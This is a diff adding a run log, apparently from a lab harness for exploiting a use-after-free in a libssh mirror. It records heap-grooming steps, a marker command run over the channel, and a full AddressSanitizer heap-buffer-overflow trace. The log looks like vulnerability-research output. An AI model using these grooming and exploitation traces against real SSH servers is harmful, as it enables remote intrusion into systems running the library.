@@ -1,0 +1,84 @@
+[2026/11/26 02:05:03.804842, 1] ssh_strict_fopen:  Failed to open a file /etc/ssh/ssh_known_hosts for reading: No such file or directory
+SERVER auth len user=5 pass=9 success=0
+CLIENT auth rc=0
+SERVER registered callbacks on channel 43
+CLIENT channel local=43 remote=43
+SERVER data #1 len=12 first=f 
+CLIENT sent exec cmd=touch evidence-wire-vuln-groom-exec.marker fn=0x60213203a5e0
+CLIENT sent groom wire pointer=0x602132152180 survive=0
+CLIENT sent close+data marker=MISHE-LIBSSH-UAF-WIRE
+SERVER close callback
+SERVER data #2 len=128 first=t off16=i
+SERVER nodetach saved_buf=0x5030000236b0 saved_it=0x502000006f70
+[2026/11/26 02:05:04.989661, 1] ssh_socket_exception_callback:  Socket exception callback: 2 (32)
+SERVER groom alloc=0x50c00001c480 wire_off120=0x602132152180 target=0x602132152180 survive=0
+=================================================================
+==3614282==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5030000236bc at pc 0x602132044cc6 bp 0x7ffc65d2cca0 sp 0x7ffc65d2cc98
+READ of size 4 at 0x5030000236bc thread T0
+    #0 0x602132044cc5 in ssh_buffer_pass_bytes /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/buffer.c:683:17
+    #1 0x60213204c1b0 in channel_rcv_data /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/channels.c:708:13
+    #2 0x60213207b2cb in ssh_packet_process /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/packet.c:1748:14
+    #3 0x602132079bc3 in ssh_packet_socket_callback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/packet.c:1581:17
+    #4 0x6021320942e9 in ssh_socket_pollcallback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/socket.c:380:29
+    #5 0x60213208cfb6 in ssh_poll_ctx_dopoll /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/poll.c:770:33
+    #6 0x60213203970d in run_server /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire.c:381:9
+    #7 0x602132039335 in main /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire.c:748:18
+    #8 0x76256de2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #9 0x76256de2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #10 0x602131f5efb4 in _start (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire-wl-vuln+0x57fb4) (BuildId: 24e50a333a83014c1b280cfd24f6542a3d58e85d)
+
+0x5030000236bc is located 30 bytes after 30-byte region [0x503000023680,0x50300002369e)
+allocated by thread T0 here:
+    #0 0x602131fe1b0e in strdup (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire-wl-vuln+0xdab0e) (BuildId: 24e50a333a83014c1b280cfd24f6542a3d58e85d)
+    #1 0x6021320a7ae3 in ssh_find_matching /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/token.c:180:23
+    #2 0x60213205ed28 in ssh_kex_select_methods /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/kex.c:1107:34
+    #3 0x6021320b93cd in ssh_server_connection_callback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/server.c:463:14
+    #4 0x60213205e16f in ssh_packet_kexinit /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/kex.c:661:5
+    #5 0x60213207b2cb in ssh_packet_process /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/packet.c:1748:14
+    #6 0x602132079bc3 in ssh_packet_socket_callback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/packet.c:1581:17
+    #7 0x6021320942e9 in ssh_socket_pollcallback /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/socket.c:380:29
+    #8 0x60213208cfb6 in ssh_poll_ctx_dopoll /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/poll.c:770:33
+    #9 0x60213209293a in ssh_handle_packets /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/session.c:822:10
+    #10 0x60213209263b in ssh_handle_packets_termination /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/session.c:892:15
+    #11 0x6021320b8eca in ssh_handle_key_exchange /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/server.c:669:10
+    #12 0x602132039683 in run_server /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire.c:353:9
+    #13 0x602132039335 in main /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire.c:748:18
+    #14 0x76256de2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #15 0x76256de2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #16 0x602131f5efb4 in _start (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/real_wire-wl-vuln+0x57fb4) (BuildId: 24e50a333a83014c1b280cfd24f6542a3d58e85d)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/mesh-home/mishe-tauftauf2shell/lab/frontier/libsshch2shell/real/libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d/src/buffer.c:683:17 in ssh_buffer_pass_bytes
+Shadow bytes around the buggy address:
+  0x503000023400: fa fa 00 00 02 fa fa fa 00 00 00 fa fa fa 00 00
+  0x503000023480: 02 fa fa fa 00 00 00 fa fa fa 00 00 00 00 fa fa
+  0x503000023500: 00 00 00 00 fa fa 00 00 00 fa fa fa 00 00 00 00
+  0x503000023580: fa fa 00 00 06 fa fa fa 00 00 00 00 fa fa 00 00
+  0x503000023600: 00 00 fa fa 00 00 06 fa fa fa 00 00 00 06 fa fa
+=>0x503000023680: 00 00 00 06 fa fa fa[fa]fa fa fa fa 00 00 00 fa
+  0x503000023700: fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa 00 00
+  0x503000023780: 00 fa fa fa 00 00 00 fa fa fa 00 00 00 00 fa fa
+  0x503000023800: 00 00 00 00 fa fa 00 00 00 fa fa fa 00 00 00 fa
+  0x503000023880: fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa 00 00
+  0x503000023900: 00 fa fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==3614282==ABORTING
+SERVER death target=0x41414141414141c1
+CLIENT rc=0 SERVER status=0x100
